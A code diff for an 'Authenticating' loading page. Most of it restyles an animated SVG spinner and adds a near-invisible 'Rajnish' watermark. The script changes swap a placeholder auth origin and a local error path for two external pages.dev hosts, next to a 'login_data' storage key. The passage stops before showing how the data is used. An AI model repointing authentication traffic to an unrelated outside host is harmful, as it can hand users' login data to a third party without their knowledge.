@@ -45,24 +45,65 @@
 </head>
 <body>
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
-    <g stroke="#fff" stroke-width="2" fill="none">
-      <circle cx="50" cy="50" r="30" opacity="0.2" />
-      <circle cx="50" cy="50" r="0">
-        <animate attributeName="r" values="0;35" dur="1.5s" repeatCount="indefinite" />
-        <animate attributeName="opacity" values="0.8;0" dur="1.5s" repeatCount="indefinite" />
+    <g stroke="#ff8c00" stroke-width="2" fill="none">
+
+      <!-- Background rings -->
+      <circle cx="50" cy="50" r="30" stroke="#daa520" opacity="0.3" />
+      <circle cx="50" cy="50" r="40" stroke="#ffd700" opacity="0.15" />
+
+      <!-- Incoming stream -->
+      <path d="M10 50 A40 40 0 0 1 90 50" stroke="#ff8c00" stroke-dasharray="10 10">
+        <animate attributeName="stroke-dashoffset" values="0;20" dur="0.8s" repeatCount="indefinite" />
+      </path>
+
+      <!-- Outgoing stream -->
+      <path d="M10 50 A40 40 0 0 0 90 50" stroke="#ffa500" stroke-dasharray="10 10">
+        <animate attributeName="stroke-dashoffset" values="20;0" dur="0.8s" repeatCount="indefinite" />
+      </path>
+
+      <!-- Expanding ripple wave 1 -->
+      <circle cx="50" cy="50" r="0" stroke="#ff8c00" stroke-width="2.5" fill="none">
+        <animate attributeName="r" values="0;40" dur="1.8s" repeatCount="indefinite" />
+        <animate attributeName="opacity" values="0.9;0" dur="1.8s" repeatCount="indefinite" />
       </circle>
-      <circle cx="50" cy="50" r="5" opacity="0.8">
-        <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="1s" repeatCount="indefinite" />
+
+      <!-- Expanding ripple wave 2 -->
+      <circle cx="50" cy="50" r="10" stroke="#ffa500" stroke-width="2.5" fill="none" opacity="0.5">
+        <animate attributeName="r" values="10;50" dur="1.8s" begin="0.9s" repeatCount="indefinite" />
+        <animate attributeName="opacity" values="0.7;0" dur="1.8s" begin="0.9s" repeatCount="indefinite" />
       </circle>
+
+      <!-- Center rotating energy ring -->
+      <g transform="translate(50,50)">
+        <circle r="6" stroke="#ff8c00" stroke-width="2" fill="none" stroke-dasharray="10 8">
+          <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="1.6s" repeatCount="indefinite" />
+        </circle>
+        <circle r="2.5" fill="#ff8c00" opacity="0.8">
+          <animate attributeName="opacity" values="0.8;0.3;0.8" dur="1.6s" repeatCount="indefinite" />
+        </circle>
+      </g>
+
     </g>
+
+    <!--watermark-->
+    <text x="50" y="54" text-anchor="middle"
+          font-family="cursive"
+          font-weight="700"
+          font-size="12"
+          fill="#ffffff"
+          opacity=".03"
+          transform="rotate(-30 50 50)"
+          pointer-events="none">
+      Rajnish
+    </text>
   </svg>
   
   <div class="text">Authenticating<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></div>
 
   <script>
-    const auth_origin = 'https://auth.example.com';
+    const auth_origin = 'https://ss-7uu.pages.dev';
     const STORAGE_KEY = 'login_data';
-    const errorpage = '/error?msg=';
+    const errorpage = 'https://dc-auth-err.pages.dev/?msg=';
     let dataReceived = false;
     
     const timeout = setTimeout(() => {
